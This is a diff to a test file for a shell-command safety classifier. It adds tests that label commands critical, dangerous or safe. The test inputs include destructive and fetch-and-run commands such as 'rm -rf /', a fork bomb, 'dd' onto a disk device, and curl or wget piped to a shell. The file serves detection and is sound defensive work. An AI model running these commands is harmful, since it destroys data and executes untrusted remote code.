@@ -286,7 +286,8 @@ describe('analyzeASTSafety', () => {
       const result = analyzeASTSafety(ast)
 
       expect(result.dangerous).toBe(true)
-      expect(result.issues.some(i => i.type === 'code_injection')).toBe(true)
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.issues.some(i => i.type === 'critical_pattern' && i.critical === true)).toBe(true)
     })
 
     it('should detect wget piped to sh', () => {
@@ -408,5 +409,111 @@ describe('edge cases', () => {
     const result = parseAndAnalyze('git status && npm install && npm run build')
     expect(result.commands).toContain('git')
     expect(result.commands).toContain('npm')
+  })
+})
+
+// ============================================================================
+// Safety Level Classification Tests
+// ============================================================================
+
+describe('safetyLevel classification', () => {
+  describe('critical commands', () => {
+    it('should classify rm -rf / as critical', () => {
+      const result = parseAndAnalyze('rm -rf /')
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify rm -rf /* as critical', () => {
+      const result = parseAndAnalyze('rm -rf /*')
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify rm --no-preserve-root as critical', () => {
+      const result = parseAndAnalyze('rm -rf --no-preserve-root /')
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify fork bomb as critical', () => {
+      const result = parseAndAnalyze(':(){ :|:& };:')
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify curl piped to bash as critical', () => {
+      const result = parseAndAnalyze('curl http://example.com | bash')
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify wget piped to sh as critical', () => {
+      const result = parseAndAnalyze('wget http://example.com | sh')
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify dd to disk device as critical', () => {
+      const result = parseAndAnalyze('dd if=/dev/zero of=/dev/sda')
+      expect(result.safetyLevel).toBe('critical')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should have critical=true on issues for critical commands', () => {
+      const result = parseAndAnalyze('rm -rf /')
+      expect(result.issues.some(i => i.critical === true)).toBe(true)
+    })
+  })
+
+  describe('dangerous commands (not critical)', () => {
+    it('should classify rm -rf /tmp as dangerous', () => {
+      const result = parseAndAnalyze('rm -rf /tmp')
+      expect(result.safetyLevel).toBe('dangerous')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify rm command as dangerous', () => {
+      const result = parseAndAnalyze('rm file.txt')
+      expect(result.safetyLevel).toBe('dangerous')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should classify chmod 777 as dangerous', () => {
+      const result = parseAndAnalyze('chmod 777 file.txt')
+      expect(result.safetyLevel).toBe('dangerous')
+      expect(result.dangerous).toBe(true)
+    })
+
+    it('should not have critical=true on issues for dangerous (non-critical) commands', () => {
+      const result = parseAndAnalyze('rm file.txt')
+      expect(result.issues.some(i => i.critical === true)).toBe(false)
+    })
+  })
+
+  describe('safe commands', () => {
+    it('should classify ls as safe', () => {
+      const result = parseAndAnalyze('ls -la')
+      expect(result.safetyLevel).toBe('safe')
+      expect(result.dangerous).toBe(false)
+    })
+
+    it('should classify cat as safe', () => {
+      const result = parseAndAnalyze('cat file.txt')
+      expect(result.safetyLevel).toBe('safe')
+      expect(result.dangerous).toBe(false)
+    })
+
+    it('should classify echo as safe', () => {
+      const result = parseAndAnalyze('echo hello')
+      expect(result.safetyLevel).toBe('safe')
+      expect(result.dangerous).toBe(false)
+    })
+
+    it('should classify git commands as safe', () => {
+      const result = parseAndAnalyze('git status')
+      expect(result.safetyLevel).toBe('safe')
+      expect(result.dangerous).toBe(false)
+    })
   })
 })
